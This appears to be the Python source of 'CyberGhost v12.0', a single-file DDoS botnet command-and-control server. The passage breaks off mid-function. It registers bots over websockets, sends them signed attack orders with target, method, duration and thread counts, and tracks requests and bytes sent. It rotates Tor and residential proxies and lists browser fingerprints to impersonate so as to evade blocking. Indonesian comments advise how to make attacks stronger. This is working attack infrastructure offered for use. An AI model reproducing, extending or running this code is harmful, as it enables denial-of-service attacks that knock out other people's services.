#!/usr/bin/env python3
"""
CyberGhost v12.0 — unified C2 + agent + web GUI, single file.

tor.py adalah gateway management — mengatur Tor SOCKS5 + circuit rotation
via control port. BUKAN penguat DDoS. Tor sebagai gateway traffic: OK.
Tor sebagai booster DDoS: 100-1000x lebih lemah dari residential proxy
(1500 exit node, semua diblokir Cloudflare/Google/Akamai). Lihat komentar
di tor.py untuk detail. Gunakan bersama rotating residential proxy
untuk hasil kuat.

Run C2:        python app.py --workers 4
Run agent:     python app.py --agent --c2 wss://c2.example.com --token BOT_TOKEN --workers 4
Run gateway:   python tor.py --mode gateway --listen 127.0.0.1:9040
Check:         python app.py --check
Gen token:     python app.py --gen-token <bot_id>
Hash pass:     python app.py --hash-pass
"""
import argparse
import asyncio
import contextlib
import hashlib
import hmac
import json
import logging
import logging.handlers
import os
import platform
import random
import re
import socket
import ssl
import string
import struct
import sys
import time
from collections import OrderedDict
from datetime import datetime, timedelta, timezone
from typing import Dict, Set, Optional, List, Tuple
from urllib.parse import urlparse

try:
    import aiohttp
    from aiohttp_socks import ProxyConnector, ProxyType
    AIOHTTP_SOCKS_OK = True
except ImportError:
    AIOHTTP_SOCKS_OK = False

try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    CURL_CFFI_OK = True
    IMPERSONATE_TARGETS = [
        "chrome99", "chrome100", "chrome101", "chrome104", "chrome107",
        "chrome110", "chrome116", "chrome119", "chrome120", "chrome123",
        "chrome124", "chrome127", "chrome128",
        "edge99", "edge101",
        "safari15_3", "safari15_5", "safari17_0", "safari17_2_ios", "safari17_4",
        "firefox128", "firefox129",
    ]
except ImportError:
    CURL_CFFI_OK = False
    IMPERSONATE_TARGETS = []

try:
    import h2.connection
    import h2.config
    H2_OK = True
except ImportError:
    H2_OK = False

try:
    from cryptography.fernet import Fernet
    import base64
    FERNET_OK = True
except ImportError:
    FERNET_OK = False

import aiosqlite
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import jwt, JWTError
from passlib.context import CryptContext
from pydantic import BaseModel, Field

try:
    import websockets as _ws_lib
    WS_AVAILABLE = True
except ImportError:
    WS_AVAILABLE = False

# ============================================================
# CONFIG
# ============================================================
VERSION = "12.0"
BUILD = "6767"
C2_HOST = os.getenv("CG_HOST", "0.0.0.0")
C2_PORT = int(os.getenv("CG_PORT", "8000"))
C2_TLS_CERT = os.getenv("CG_TLS_CERT", "")
C2_TLS_KEY = os.getenv("CG_TLS_KEY", "")
REQUIRE_TLS = os.getenv("CG_REQUIRE_TLS", "1") == "1"
ALLOW_PLAINTEXT_AGENT = os.getenv("CG_ALLOW_PLAINTEXT", "0") == "1"
ADMIN_USER = os.getenv("CG_ADMIN_USER", "ghost")
ADMIN_PASS = os.getenv("CG_ADMIN_PASS", "")
ADMIN_HASH = os.getenv("CG_ADMIN_HASH", "")
AGENT_SECRET = os.getenv("CG_AGENT_SECRET", "change-me-agent-secret-please-32b")
JWT_SECRET = os.getenv("CG_JWT_SECRET", "change-me-32-bytes-minimum-secret-please")
JWT_ALG = "HS256"
JWT_AUD = "cyberghost"
JWT_ISS = "cyberghost-c2"
JWT_TTL_MIN = 60
DB_PATH = os.getenv("CG_DB", "cyberghost.db")
LOG_PATH = os.getenv("CG_LOG", "cyberghost.log")
PROXIES_FILE = os.getenv("CG_PROXIES_FILE", "proxies.txt")
PROXIES_SECRET = os.getenv("CG_PROXIES_SECRET", "")
ENCRYPT_PENDING = os.getenv("CG_ENCRYPT_PENDING", "1") == "1"
REQUIRE_PROXY = os.getenv("CG_REQUIRE_PROXY", "0") == "1"
TOR_GATEWAY_URL = os.getenv("CG_TOR_GATEWAY", "socks5://127.0.0.1:9050")
USE_TOR = os.getenv("CG_USE_TOR", "0") == "1"
PROXY_HEALTH_INTERVAL = int(os.getenv("CG_PROXY_HEALTH", "60"))
PROXY_HEALTH_TIMEOUT = float(os.getenv("CG_PROXY_TIMEOUT", "8"))
PROXY_CACHE_TTL = 2.0
SESSION_CACHE_MAX = 32
CURL_SESSION_MAX = 32
MAX_CONCURRENT_ATTACKS = int(os.getenv("CG_MAX_CONCURRENT", "32"))
MAX_DURATION_SEC = int(os.getenv("CG_MAX_DURATION", "3600"))
MAX_THREADS = int(os.getenv("CG_MAX_THREADS", "4096"))
LOGIN_RATE_WINDOW = 60
LOGIN_RATE_MAX = 10
MAX_WS_BOTS = 500
MAX_WS_PER_IP = 10
REGISTER_RATE_MAX_GLOBAL = 100
REGISTER_RATE_MAX_PER_IP = 5
ATTACK_RATE_WINDOW = 60
ATTACK_RATE_MAX = 4
BOT_ID_RE = re.compile(r"^[a-zA-Z0-9_-]{4,64}$")
BLOCKED_NETWORKS = [
    "127.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.",
    "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.",
    "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.",
    "169.254.", "0.", "224.", "240.",
]
BLOCKED_HOSTS = ["localhost", "metadata.google.internal", "instance-data"]

# ============================================================
# LOG
# ============================================================
def setup_logging():
    logger = logging.getLogger("cyberghost")
    logger.setLevel(logging.INFO)
    if logger.handlers: return logger
    fh = logging.handlers.RotatingFileHandler(LOG_PATH, maxBytes=10*1024*1024, backupCount=5)
    fh.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(fh)
    sh = logging.StreamHandler(sys.stderr)
    sh.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    logger.addHandler(sh)
    return logger

log = setup_logging()

def audit(event: str, **kw):
    log.info(json.dumps({"event": event, **kw}, default=str))

# ============================================================
# CRYPTO
# ============================================================
def _fernet_from_secret(secret: str):
    if not FERNET_OK or not secret: return None
    key = hashlib.sha256(secret.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def encrypt_pending(secret: str, data: str) -> str:
    f = _fernet_from_secret(secret)
    if not f: return data
    return "ENC:" + f.encrypt(data.encode()).decode()

def decrypt_pending(secret: str, data: str) -> str:
    if not data.startswith("ENC:"): return data
    f = _fernet_from_secret(secret)
    if not f: return data[4:]
    return f.decrypt(data[4:].encode()).decode()

# ============================================================
# DB
# ============================================================
SCHEMA = """
CREATE TABLE IF NOT EXISTS bots (
    bot_id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, os TEXT, arch TEXT,
    cpu_cores INTEGER, ram_mb INTEGER, last_seen REAL, connected INTEGER DEFAULT 0,
    agent_version TEXT, capabilities TEXT
);
CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, target_ip TEXT,
    method TEXT, port INTEGER, duration INTEGER, threads INTEGER,
    started_at REAL, ended_at REAL, status TEXT, assigned_bots INTEGER DEFAULT 0,
    requests_sent INTEGER DEFAULT 0, bytes_sent INTEGER DEFAULT 0,
    payload_json TEXT
);
CREATE TABLE IF NOT EXISTS pending_commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT,
    command_json TEXT, created_at REAL, delivered INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS revoked_tokens (
    jti TEXT PRIMARY KEY, expires_at REAL
);
CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT, event_json TEXT, created_at REAL
);
CREATE TABLE IF NOT EXISTS proxies (
    proxy_id TEXT PRIMARY KEY, proxy_url TEXT, healthy INTEGER DEFAULT 0,
    last_check REAL, ok_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS register_attempts (
    id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, ip TEXT
);
CREATE TABLE IF NOT EXISTS login_buckets (
    id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, ts REAL
);
CREATE TABLE IF NOT EXISTS attack_attempts (
    id INTEGER PRIMARY KEY AUTOINCREMENT, admin TEXT, ts REAL
);
CREATE TABLE IF NOT EXISTS kv (
    k TEXT PRIMARY KEY, v TEXT
);
CREATE INDEX IF NOT EXISTS idx_attacks_status ON attacks(status);
CREATE INDEX IF NOT EXISTS idx_pending_bot ON pending_commands(bot_id, delivered);
CREATE INDEX IF NOT EXISTS idx_events_created ON events(created_at);
CREATE INDEX IF NOT EXISTS idx_proxies_healthy ON proxies(healthy);
CREATE INDEX IF NOT EXISTS idx_register_ts ON register_attempts(ts);
CREATE INDEX IF NOT EXISTS idx_login_ts ON login_buckets(ip, ts);
CREATE INDEX IF NOT EXISTS idx_attack_ts ON attack_attempts(admin, ts);
"""

_db_busy_retries = 3

async def _db_conn():
    db = await aiosqlite.connect(DB_PATH, timeout=5.0)
    await db.execute("PRAGMA busy_timeout=5000")
    await db.execute("PRAGMA journal_mode=WAL")
    await db.execute("PRAGMA synchronous=NORMAL")
    return db

async def init_db():
    async with await _db_conn() as db:
        await db.executescript(SCHEMA)
        await db.commit()

async def kv_get(k):
    async with await _db_conn() as db:
        async with db.execute("SELECT v FROM kv WHERE k=?", (k,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else None

async def kv_set(k, v):
    async with await _db_conn() as db:
        await db.execute("INSERT OR REPLACE INTO kv (k, v) VALUES (?,?)", (k, v))
        await db.commit()

async def upsert_bot(b):
    for attempt in range(_db_busy_retries):
        try:
            async with await _db_conn() as db:
                await db.execute(
                    """INSERT INTO bots (bot_id,hostname,ip,os,arch,cpu_cores,ram_mb,last_seen,connected,agent_version,capabilities)
                       VALUES (?,?,?,?,?,?,?,?,1,?,?)
                       ON CONFLICT(bot_id) DO UPDATE SET
                         hostname=excluded.hostname, ip=excluded.ip, os=excluded.os,
                         arch=excluded.arch, cpu_cores=excluded.cpu_cores,
                         ram_mb=excluded.ram_mb, last_seen=excluded.last_seen,
                         connected=1, agent_version=excluded.agent_version,
                         capabilities=excluded.capabilities""",
                    (b["bot_id"], b["hostname"], b["ip"], b["os"], b["arch"],
                     b["cpu_cores"], b["ram_mb"], b["last_seen"],
                     b.get("agent_version", "?"), b.get("capabilities", "")),
                )
                await db.commit(); return
        except aiosqlite.OperationalError:
            await asyncio.sleep(0.05 * (attempt + 1))

async def bot_exists(bid):
    async with await _db_conn() as db:
        async with db.execute("SELECT 1 FROM bots WHERE bot_id=?", (bid,)) as cur:
            return await cur.fetchone() is not None

async def bot_offline(bid):
    for attempt in range(_db_busy_retries):
        try:
            async with await _db_conn() as db:
                await db.execute("UPDATE bots SET connected=0 WHERE bot_id=?", (bid,))
                await db.commit(); return
        except aiosqlite.OperationalError:
            await asyncio.sleep(0.05 * (attempt + 1))

async def list_bots():
    async with await _db_conn() as db:
        async with db.execute("SELECT * FROM bots ORDER BY last_seen DESC") as cur:
            rows = await cur.fetchall()
            cols = [c[0] for c in cur.description]
            return [dict(zip(cols, r)) for r in rows]

async def new_attack_atomic(a, payload_base):
    async with await _db_conn() as db:
        cur = await db.execute(
            """INSERT INTO attacks (target,target_ip,method,port,duration,threads,started_at,status,assigned_bots,payload_json)
               VALUES (?,?,?,?,?,?,?,?,?,?)""",
            (a["target"], a["target_ip"], a["method"], a["port"], a["duration"],
             a["threads"], a["started_at"], "running", a["assigned_bots"], ""),
        )
        aid = cur.lastrowid
        payload = {**payload_base, "attack_id": aid}
        await db.execute("UPDATE attacks SET payload_json=? WHERE id=?", (json.dumps(payload), aid))
        await db.commit()
        return aid, payload

async def finish_attack(aid, status="finished"):
    async with await _db_conn() as db:
        await db.execute("UPDATE attacks SET status=?, ended_at=? WHERE id=?",
                         (status, time.time(), aid))
        await db.commit()

async def list_attacks(limit=200):
    async with await _db_conn() as db:
        async with db.execute("SELECT * FROM attacks ORDER BY id DESC LIMIT ?", (limit,)) as cur:
            rows = await cur.fetchall()
            cols = [c[0] for c in cur.description]
            return [dict(zip(cols, r)) for r in rows]

async def get_attack(aid):
    async with await _db_conn() as db:
        async with db.execute("SELECT * FROM attacks WHERE id=?", (aid,)) as cur:
            row = await cur.fetchone()
            if not row: return None
            cols = [c[0] for c in cur.description]
            return dict(zip(cols, row))

async def running_attacks():
    async with await _db_conn() as db:
        async with db.execute("SELECT * FROM attacks WHERE status='running'") as cur:
            rows = await cur.fetchall()
            cols = [c[0] for c in cur.description]
            return [dict(zip(cols, r)) for r in rows]

async def bump(aid, req, byt):
    async with await _db_conn() as db:
        await db.execute(
            "UPDATE attacks SET requests_sent=requests_sent+?, bytes_sent=bytes_sent+? WHERE id=?",
            (req, byt, aid))
        await db.commit()

async def enqueue_command(bot_id, cmd_json):
    if ENCRYPT_PENDING and AGENT_SECRET and not AGENT_SECRET.startswith("change-me"):
        cmd_json = encrypt_pending(AGENT_SECRET, cmd_json)
    async with await _db_conn() as db:
        await db.execute(
            "INSERT INTO pending_commands (bot_id, command_json, created_at) VALUES (?,?,?)",
            (bot_id, cmd_json, time.time()))
        await db.commit()

async def take_pending(bot_id):
    async with await _db_conn() as db:
        async with db.execute(
            "SELECT id, command_json FROM pending_commands WHERE bot_id=? AND delivered=0 ORDER BY id ASC LIMIT 100",
            (bot_id,)) as cur:
            rows = await cur.fetchall()
        for rid, _ in rows:
            await db.execute("UPDATE pending_commands SET delivered=1 WHERE id=?", (rid,))
        await db.commit()
        out = []
        for _rid, cj in rows:
            if ENCRYPT_PENDING and AGENT_SECRET and not AGENT_SECRET.startswith("change-me"):
                with contextlib.suppress(Exception):
                    cj = decrypt_pending(AGENT_SECRET, cj)
            out.append(cj)
        return out

async def revoke_jti(jti, expires_at):
    async with await _db_conn() as db:
        await db.execute("INSERT OR REPLACE INTO revoked_tokens (jti, expires_at) VALUES (?,?)",
                         (jti, expires_at))
        await db.commit()

async def is_revoked(jti):
    async with await _db_conn() as db:
        async with db.execute("SELECT 1 FROM revoked_tokens WHERE jti=?", (jti,)) as cur:
            return await cur.fetchone() is not None

async def push_event(ev):
    async with await _db_conn() as db:
        await db.execute("INSERT INTO events (event_json, created_at) VALUES (?,?)",
                         (json.dumps(ev), time.time()))
        await db.commit()

async def cleanup_events():
    async with await _db_conn() as db:
        await db.execute("DELETE FROM events WHERE id IN (SELECT id FROM events WHERE created_at < ? LIMIT 500)",
                         (time.time() - 300,))
        await db.execute("DELETE FROM register_attempts WHERE ts < ?", (time.time() - 120,))
        await db.execute("DELETE FROM login_buckets WHERE ts < ?", (time.time() - 120,))
        await db.execute("DELETE FROM attack_attempts WHERE ts < ?", (time.time() - 120,))
        await db.commit()

async def recent_events(since_id):
    async with await _db_conn() as db:
        async with db.execute("SELECT id, event_json FROM events WHERE id > ? ORDER BY id ASC LIMIT 200",
                              (since_id,)) as cur:
            return await cur.fetchall()

async def register_rate_ok(ip, bid):
    if await bot_exists(bid): return True
    async with await _db_conn() as db:
        now = time.time()
        async with db.execute("SELECT COUNT(*) FROM register_attempts WHERE ts > ?", (now - 60,)) as cur:
            if (await cur.fetchone())[0] >= REGISTER_RATE_MAX_GLOBAL: return False
        async with db.execute("SELECT COUNT(*) FROM register_attempts WHERE ip=? AND ts > ?", (ip, now - 60)) as cur:
            if (await cur.fetchone())[0] >= REGISTER_RATE_MAX_PER_IP: return False
        await db.execute("INSERT INTO register_attempts (ts, ip) VALUES (?,?)", (now, ip))
        await db.commit()
        return True

async def login_rate_ok(ip):
    async with await _db_conn() as db:
        now = time.time()
        async with db.execute("SELECT COUNT(*) FROM login_buckets WHERE ip=? AND ts > ?",
                              (ip, now - LOGIN_RATE_WINDOW)) as cur:
            if (await cur.fetchone())[0] >= LOGIN_RATE_MAX: return False
        await db.execute("INSERT INTO login_buckets (ip, ts) VALUES (?,?)", (ip, now))
        await db.commit()
        return True

async def attack_rate_ok(admin):
    async with await _db_conn() as db:
        now = time.time()
        async with db.execute("SELECT COUNT(*) FROM attack_attempts WHERE admin=? AND ts > ?",
                              (admin, now - ATTACK_RATE_WINDOW)) as cur:
            if (await cur.fetchone())[0] >= ATTACK_RATE_MAX: return False
        await db.execute("INSERT INTO attack_attempts (admin, ts) VALUES (?,?)", (admin, now))
        await db.commit()
        return True

async def upsert_proxy(proxy_url, healthy):
    pid = hashlib.sha256(proxy_url.encode()).hexdigest()[:16]
    async with await _db_conn() as db:
        await db.execute(
            """INSERT INTO proxies (proxy_id, proxy_url, healthy, last_check, ok_count, fail_count)
               VALUES (?,?,?,?,?,?)
               ON CONFLICT(proxy_id) DO UPDATE SET
                 healthy=excluded.healthy, last_check=excluded.last_check,
                 ok_count=ok_count+excluded.ok_count, fail_count=fail_count+excluded.fail_count""",
            (pid, proxy_url, 1 if healthy else 0, time.time(),
             1 if healthy else 0, 0 if healthy else 1))
        await db.commit()

async def get_healthy_proxies():
    async with await _db_conn() as db:
        async with db.execute(
            "SELECT proxy_url FROM proxies WHERE healthy=1 AND last_check > ?",
            (time.time() - PROXY_HEALTH_INTERVAL * 3,)) as cur:
            return [r[0] for r in await cur.fetchall()]

async def proxy_stats():
    async with await _db_conn() as db:
        async with db.execute("SELECT COUNT(*), SUM(healthy) FROM proxies") as cur:
            row = await cur.fetchone()
            return {"total": (row[0] or 0), "healthy": (row[1] or 0)}

# ============================================================
# PROXY POOL
# ============================================================
def _load_proxies_file(path, require):
    lines = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = f.read()
    except FileNotFoundError:
        if require: raise RuntimeError(f"proxies file {path} missing but REQUIRE_PROXY=1")
        return []
    if PROXIES_SECRET and raw.startswith("ENC:"):
        f = _fernet_from_secret(PROXIES_SECRET)
        if not f: raise RuntimeError("proxies encrypted but cryptography missing")
        raw = f.decrypt(raw[4:].encode()).decode()
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        if "://" not in line: line = "socks5://" + line
        lines.append(line)
    return lines

class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.healthy_cache = []
        self.cache_ts = 0.0
        self._rr_index = 0
        self._health_task = None
        self._started = False

    async def load_and_start(self, path, require):
        self.proxies = _load_proxies_file(path, require)
        if USE_TOR:
            self.proxies.insert(0, TOR_GATEWAY_URL)
            log.info("Tor gateway added to pool: %s", TOR_GATEWAY_URL)
        log.info("proxy pool loaded: %d total", len(self.proxies))
        if not self.proxies: return
        for p in self.proxies:
            await upsert_proxy(p, False)
        await self._check_all()
        started = await kv_get("proxy_pool_started")
        if not started:
            await kv_set("proxy_pool_started", "1")
            self._health_task = asyncio.create_task(self._health_loop())
        self._started = True

    async def _health_loop(self):
        while True:
            await asyncio.sleep(PROXY_HEALTH_INTERVAL)
            await self._check_all()

    async def _check_all(self):
        if not AIOHTTP_SOCKS_OK and not CURL_CFFI_OK: return
        sem = asyncio.Semaphore(50)
        tasks = [self._check_one(p, sem) for p in self.proxies]
        await asyncio.gather(*tasks, return_exceptions=True)
        stats = await proxy_stats()
        log.info("proxy health: %d/%d healthy", stats["healthy"], stats["total"])

    async def _check_one(self, proxy_url, sem):
        async with sem:
            ok = False
            try:
                if AIOHTTP_SOCKS_OK:
                    connector = _make_connector(proxy_url)
                    timeout = aiohttp.ClientTimeout(total=PROXY_HEALTH_TIMEOUT)
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
                        async with sess.get("https://api.ipify.org?format=json") as r:
                            ok = r.status == 200
                elif CURL_CFFI_OK:
                    async with CurlAsyncSession(proxies={"https": proxy_url, "http": proxy_url},
                                                timeout=PROXY_HEALTH_TIMEOUT) as sess:
                        r = await sess.get("https://api.ipify.org?format=json")
                        ok = r.status_code == 200
            except Exception:
                ok = False
            await upsert_proxy(proxy_url, ok)

    async def _refresh_cache(self):
        if time.time() - self.cache_ts < PROXY_CACHE_TTL: return
        self.healthy_cache = await get_healthy_proxies()
        self.cache_ts = time.time()

    async def pick(self):
        await self._refresh_cache()
        if self.healthy_cache:
            p = self.healthy_cache[self._rr_index % len(self.healthy_cache)]
            self._rr_index += 1
            return p
        if REQUIRE_PROXY: return None
        if self.proxies:
            p = self.proxies[self._rr_index % len(self.proxies)]
            self._rr_index += 1
            return p
        return None

    async def stats(self): return await proxy_stats()

proxy_pool = ProxyPool()

def _make_connector(proxy_url):
    u = urlparse(proxy_url)
    scheme = u.scheme.lower()
    if scheme in ("socks5", "socks5h", "socks4"):
        ptype = ProxyType.SOCKS5 if scheme.startswith("socks5") else ProxyType.SOCKS4
        return ProxyConnector(proxy_type=ptype, host=u.hostname, port=u.port or 1080,
                              username=u.username, password=u.password, rdns=True)
    return ProxyConnector.from_url(proxy_url)

class SessionPool:
    def __init__(self):
        self._sessions = OrderedDict()
        self._lock = asyncio.Lock()

    async def get(self, proxy):
        if not AIOHTTP_SOCKS_OK: return None
        key = proxy or "_direct_"
        async with self._lock:
            sess = self._sessions.get(key)
            if sess and not sess.closed:
                self._sessions.move_to_end(key); return sess
            connector = _make_connector(proxy) if proxy else None
            sess = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=15))
            self._sessions[key] = sess
            while len(self._sessions) > SESSION_CACHE_MAX:
                _k, old = self._sessions.popitem(last=False)
                with contextlib.suppress(Exception): await old.close()
            return sess

    async def close(self):
        for sess in self._sessions.values():
            with contextlib.suppress(Exception): await sess.close()
        self._sessions.clear()

class CurlSessionPool:
    def __init__(self):
        self._sessions = OrderedDict()
        self._lock = asyncio.Lock()

    async def get(self, proxy):
        if not CURL_CFFI_OK: return None
        key = proxy or "_direct_"
        async with self._lock:
            sess = self._sessions.get(key)
            if sess:
                self._sessions.move_to_end(key); return sess
            proxies = {"https": proxy, "http": proxy} if proxy else None
            sess = CurlAsyncSession(proxies=proxies, timeout=15)
            self._sessions[key] = sess
            while len(self._sessions) > CURL_SESSION_MAX:
                _k, old = self._sessions.popitem(last=False)
                with contextlib.suppress(Exception): await old.close()
            return sess

    async def close(self):
        for sess in self._sessions.values():
            with contextlib.suppress(Exception): await sess.close()
        self._sessions.clear()

# ============================================================
# HUB
# ============================================================
class Hub:
    def __init__(self):
        self.admins = set(); self.bots = {}
        self.bot_ips = {}; self.ip_counts = {}
        self.lock = asyncio.Lock()
        self._bus_task = None; self._cleanup_task = None
        self._last_event_id = 0
        self._origin = f"{os.getpid()}:{id(self)}"

    async def start_bus(self):
        if self._bus_task: return
        self._bus_task = asyncio.create_task(self._poll_events())
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())

    async def _cleanup_loop(self):
        while True:
            await asyncio.sleep(60)
            with contextlib.suppress(Exception): await cleanup_events()

    async def _poll_events(self):
        while True:
            try:
                rows = await recent_events(self._last_event_id)
                for rid, ev_json in rows:
                    self._last_event_id = max(self._last_event_id, rid)
                    try: ev = json.loads(ev_json)
                    except Exception: continue
                    if ev.get("_origin") == self._origin: continue
                    await self._local_bcast(ev)
            except Exception: pass
            await asyncio.sleep(5)

    async def add_admin(self, ws): self.admins.add(ws)
    async def drop_admin(self, ws): self.admins.discard(ws)

    async def add_bot(self, bid, ws, ip):
        async with self.lock:
            if len(self.bots) >= MAX_WS_BOTS: raise RuntimeError("bot limit")
            if self.ip_counts.get(ip, 0) >= MAX_WS_PER_IP: raise RuntimeError("ip limit")
            self.bots[bid] = ws; self.bot_ips[bid] = ip
            self.ip_counts[ip] = self.ip_counts.get(ip, 0) + 1

    async def drop_bot(self, bid):
        async with self.lock:
            self.bots.pop(bid, None)
            ip = self.bot_ips.pop(bid, None)
            if ip: self.ip_counts[ip] = max(0, self.ip_counts.get(ip, 1) - 1)

    async def _local_bcast(self, msg):
        p = json.dumps(msg); dead = []
        for ws in list(self.admins):
            try: await ws.send_text(p)
            except Exception: dead.append(ws)
        for ws in dead: self.admins.discard(ws)

    async def bcast(self, msg):
        msg["_origin"] = self._origin
        await self._local_bcast(msg)
        with contextlib.suppress(Exception): await push_event(msg)

    async def to_bots(self, bids, msg):
        msg_with_sig = {**msg, "_sig": sign_command(msg)}
        p = json.dumps(msg_with_sig)
        async with self.lock:
            for bid in bids:
                ws = self.bots.get(bid)
                if ws:
                    try: await ws.send_text(p); continue
                    except Exception: self.bots.pop(bid, None)
                await enqueue_command(bid, p)

    async def to_all_bots(self, msg): await self.to_bots(list(self.bots.keys()), msg)

hub = Hub()

# ============================================================
# AUTH
# ============================================================
pwd_ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2 = OAuth2PasswordBearer(tokenUrl="/api/token")

def verify_admin_pass(candidate):
    if ADMIN_HASH:
        with contextlib.suppress(Exception): return pwd_ctx.verify(candidate, ADMIN_HASH)
        return False
    if not ADMIN_PASS: return False
    return hmac.compare_digest(candidate.encode(), ADMIN_PASS.encode())

def make_bot_token(bot_id):
    mac = hmac.new(AGENT_SECRET.encode(), bot_id.encode(), hashlib.sha256).hexdigest()
    return bot_id + "." + mac

def verify_bot_token(bot_id, token):
    if not BOT_ID_RE.match(bot_id): return False
    if "." not in token: return False
    tid, mac = token.rsplit(".", 1)
    if not hmac.compare_digest(tid, bot_id): return False
    expect = hmac.new(AGENT_SECRET.encode(), bot_id.encode(), hashlib.sha256).hexdigest()
    return hmac.compare_digest(mac, expect)

def sign_command(cmd):
    payload = json.dumps(cmd, sort_keys=True).encode()
    return hmac.new(AGENT_SECRET.encode(), payload, hashlib.sha256).hexdigest()

def verify_command_sig(cmd, sig):
    return hmac.compare_digest(sign_command(cmd), sig)

def make_jwt(sub):
    jti = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
    exp = datetime.now(timezone.utc) + timedelta(minutes=JWT_TTL_MIN)
    token = jwt.encode({"sub": sub, "exp": exp, "jti": jti, "aud": JWT_AUD, "iss": JWT_ISS},
                       JWT_SECRET, algorithm=JWT_ALG)
    return token, jti, exp.timestamp()

async def current_admin(token=Depends(oauth2)):
    try:
        p = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG],
                       audience=JWT_AUD, issuer=JWT_ISS)
        if not p.get("sub"): raise JWTError()
        jti = p.get("jti")
        if jti and await is_revoked(jti): raise HTTPException(401, "token revoked")
        return p
    except JWTError:
        raise HTTPException(401, "bad token")

# ============================================================
# TARGET VALIDATION
# ============================================================
def _validate_host(host):
    hl = host.lower()
    for bh in BLOCKED_HOSTS:
        if hl == bh or hl.endswith("." + bh): raise ValueError("blocked host")
    try: ip = socket.gethostbyname(host)
    except Exception: raise ValueError("cannot resolve")
    for net in BLOCKED_NETWORKS:
        if ip.startswith(net): raise ValueError("blocked network")
    return ip

def validate_target_c2(target):
    if not target or len(target) > 255: raise HTTPException(400, "invalid target")
    parsed = urlparse(target if "://" in target else "http://" + target)
    host = parsed.hostname
    if not host: raise HTTPException(400, "no host")
    try: ip = _validate_host(host)
    except ValueError as e: raise HTTPException(400, str(e))
    return ip, host

def validate_target_agent(target_ip):
    for net in BLOCKED_NETWORKS:
        if target_ip.startswith(net): return False
    return True

# ============================================================
# MODELS
# ============================================================
class AttackIn(BaseModel):
    target: str = Field(..., min_length=3, max_length=255)
    method: str = Field(..., min_length=2, max_length=48)
    port: Optional[int] = Field(0, ge=0, le=65535)
    duration: int = Field(..., ge=1, le=MAX_DURATION_SEC)
    threads: int = Field(64, ge=1, le=MAX_THREADS)

# ============================================================
# APP
# ============================================================
app = FastAPI(title="CyberGhost", docs_url=None, redoc_url=None)

@app.on_event("startup")
async def _startup():
    await init_db()
    if AGENT_SECRET.startswith("change-me") and REQUIRE_TLS:
        log.error("FATAL: AGENT_SECRET default in production — set CG_AGENT_SECRET")
        sys.exit(1)
    if not ADMIN_HASH and not ADMIN_PASS:
        log.error("CRITICAL: no ADMIN_HASH or ADMIN_PASS — admin login disabled")
    try:
        await proxy_pool.load_and_start(PROXIES_FILE, require=REQUIRE_PROXY)
    except RuntimeError as e:
        log.error(str(e))
    if REQUIRE_TLS and not (C2_TLS_CERT and C2_TLS_KEY):
        log.error("CG_REQUIRE_TLS=1 but no cert/key")
    audit("c2_start", version=VERSION, build=BUILD, tls=bool(C2_TLS_CERT),
          proxies=await proxy_pool.stats(), tor=USE_TOR)
    await hub.start_bus()

@app.post("/api/token")
async def api_token(request: Request, form: OAuth2PasswordRequestForm = Depends()):
    ip = request.client.host if request.client else "0.0.0.0"
    if not await login_rate_ok(ip):
        raise HTTPException(429, "too many attempts")
    if form.username != ADMIN_USER or not verify_admin_pass(form.password):
        raise HTTPException(401, "bad creds")
    token, jti, exp = make_jwt(form.username)
    audit("login_ok", ip=ip, user=form.username, jti=jti)
    return {"access_token": token, "token_type": "bearer", "expires_at": exp}

@app.post("/api/logout")
async def api_logout(p=Depends(current_admin)):
    if p.get("jti") and p.get("exp"):
        await revoke_jti(p["jti"], float(p["exp"]))
    return {"ok": True}

@app.websocket("/ws/bot/{bot_id}")
async def bot_ws(ws: WebSocket, bot_id: str):
    if not BOT_ID_RE.match(bot_id):
        await ws.close(code=4000); return
    token = ws.headers.get("x-agent-token") or ws.query_params.get("token", "")
    if not verify_bot_token(bot_id, token):
        await ws.close(code=4001); return
    ip = ws.client.host if ws.client else "0.0.0.0"
    if not await register_rate_ok(ip, bot_id):
        await ws.close(code=4029, reason="register rate limit"); return
    try: await hub.add_bot(bot_id, ws, ip)
    except RuntimeError as e: await ws.close(code=4029, reason=str(e)); return
    await ws.accept()
    audit("bot_connect", bot_id=bot_id, ip=ip)
    with contextlib.suppress(Exception):
        now = time.time()
        for a in await running_attacks():
            pj = a.get("payload_json")
            if not pj: continue
            with contextlib.suppress(Exception):
                cmd = json.loads(pj)
                started = a.get("started_at", now)
                dur = a.get("duration", 0)
                remaining = int((started + dur) - now)
                if remaining <= 0: continue
                cmd["duration"] = remaining
                await hub.to_bots([bot_id], cmd)
    try:
        while True:
            m = await ws.receive_json(); t = m.get("type")
            if t in ("hello", "heartbeat", "stats"):
                sig = m.get("_sig", "")
                base = {k:v for k,v in m.items() if k != "_sig"}
